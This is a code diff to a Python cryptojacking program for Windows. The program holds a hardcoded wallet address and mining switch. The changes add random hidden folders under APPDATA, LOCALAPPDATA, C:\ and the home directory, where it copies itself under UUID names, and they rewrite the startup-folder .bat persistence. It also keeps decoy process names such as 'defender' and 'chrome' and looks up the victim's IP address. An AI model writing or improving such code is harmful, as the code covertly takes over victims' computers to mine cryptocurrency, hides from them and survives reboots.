@@ -30,6 +30,7 @@ from regex import findall
 import platform
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import time
+from pathlib import Path
 import codecs
 import os
 from http.server import HTTPServer, CGIHTTPRequestHandler
@@ -64,6 +65,13 @@ ADDRESS = "42ngecPaWvxbfLHG11xTbn8kxBydsPGT4LKHB57wF1sQM3XQBbwdt9pQFf5q8umxgkNNq
 
 CLONE_PROCESS = False # Create Instances of the program hidden in multiple path.
 PROCCESS_NAMES = ["defender", "sys", "google", "chrome", "proxy-services", "appdata-system", "visual-studio", "temp-file"]
+
+PROCESS_PATHS = [
+	os.getenv('APPDATA') + "\\"+ str(uuid.uuid4()), 
+	os.getenv('LOCALAPPDATA') + "\\"+ str(uuid.uuid4()),
+	"C:\\" + str(uuid.uuid4()),
+	str(Path.home()) + "\\" + str(uuid.uuid4())
+]
 PROCESS_NUM = processnumbers
 
 MINE = True #Mine crypto? True/False
@@ -142,25 +150,6 @@ if yes == "yes":
 			os.system(path)
 		except Exception as e:
 			print("Err : "+ str(e))
-	if(CLONE_PROCESS == True):
-		numberOfClones = 0
-		for i in range(PROCESS_NUM):
-			subfolders = os.listdir(os.getenv("APPDATA"))
-			for i in range(len(subfolders)):
-				if(valid_uuid(subfolders[i])):
-					numberOfClones = numberOfClones + 1
-					print(numberOfClones)
-			if(numberOfClones <= PROCESS_NUM):
-				original = os.path.basename(sys.argv[0])
-				folderName = str(uuid.uuid4())
-				os.mkdir(str(os.getenv('APPDATA')) +"\\" +folderName)
-				rdmchoice = random.choice(PROCCESS_NAMES) 
-				target = str(os.getenv('APPDATA')) + "\\" + folderName + "\\" + rdmchoice+ ".exe"
-				print(target)
-				
-				threading.Thread(launchProcesses(str(os.getenv('APPDATA')) + "\\" + folderName + "\\" + rdmchoice+ ".exe")).start()
-		else:
-			print("[.] Already duplicated.")
 
 	try:
 		url = 'http://ipinfo.io/json'
@@ -175,10 +164,10 @@ if yes == "yes":
 		IP = str(uuid.uuid4())
 		city = str(uuid.uuid4())
 		country = str(uuid.uuid4())
-	def add_to_startup(file_path=""):
+	def add_to_startup(file_path):
 		copyof_file = str(uuid.uuid4()) 
-		os.system("mkdir " + local_appdata + copyof_file)
-		copyof_file = local_appdata + copyof_file + "\\ekip.exe"
+		#os.system("mkdir " + local_appdata + copyof_file)
+		copyof_file = file_path
 		shutil.copy(os.path.realpath(sys.argv[0]), copyof_file)
 		print(copyof_file)
 		if file_path == "":
@@ -187,18 +176,25 @@ if yes == "yes":
 		with open(bat_path + '\\' + str(uuid.uuid4()) + ".bat", "w+") as bat_file:
 			bat_file.write(r'start "" "%s"' % file_path)
 	if(platform.system() == 'windows' or platform.system() == "Windows"):
-		f = 0
-		pathofclones= r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
-		filenames = os.listdir(pathofclones)
-		for i in range(len(filenames)):
-			print(filenames[i].replace(".bat", ""))
-			print("Valid : " + str(valid_uuid(filenames[i].replace(".bat", ""))))
-			if(valid_uuid(filenames[i].replace(".bat", "")) == True):
-				f += 1
-		print("Numbers : " + str(f))
-		if(not f >= PROCESS_NUM):
-			for i in range(PROCESS_NUM):
-				add_to_startup()
+		numberOfClones = 0
+		for i in range(PROCESS_NUM):
+			subfolders = os.listdir(os.getenv("APPDATA"))
+			for i in range(len(subfolders)):
+				if(valid_uuid(subfolders[i])):
+					numberOfClones = numberOfClones + 1
+					print(numberOfClones)
+			if(numberOfClones <= PROCESS_NUM):
+				try:
+					original = os.path.basename(sys.argv[0])
+					#folderName = str(uuid.uuid4())
+					PROCCESS_PATH = random.choice(PROCESS_PATHS)
+					os.mkdir(PROCCESS_PATH)
+					rdmchoice = str(uuid.uuid4())
+					target = PROCCESS_PATH + "\\" + rdmchoice+ ".exe"
+					print(target)
+					add_to_startup(target)
+				except:
+					continue
 	def checkIfProcessRunning(processName):
 		'''
 		Check if there is any running process that contains the given name processName.
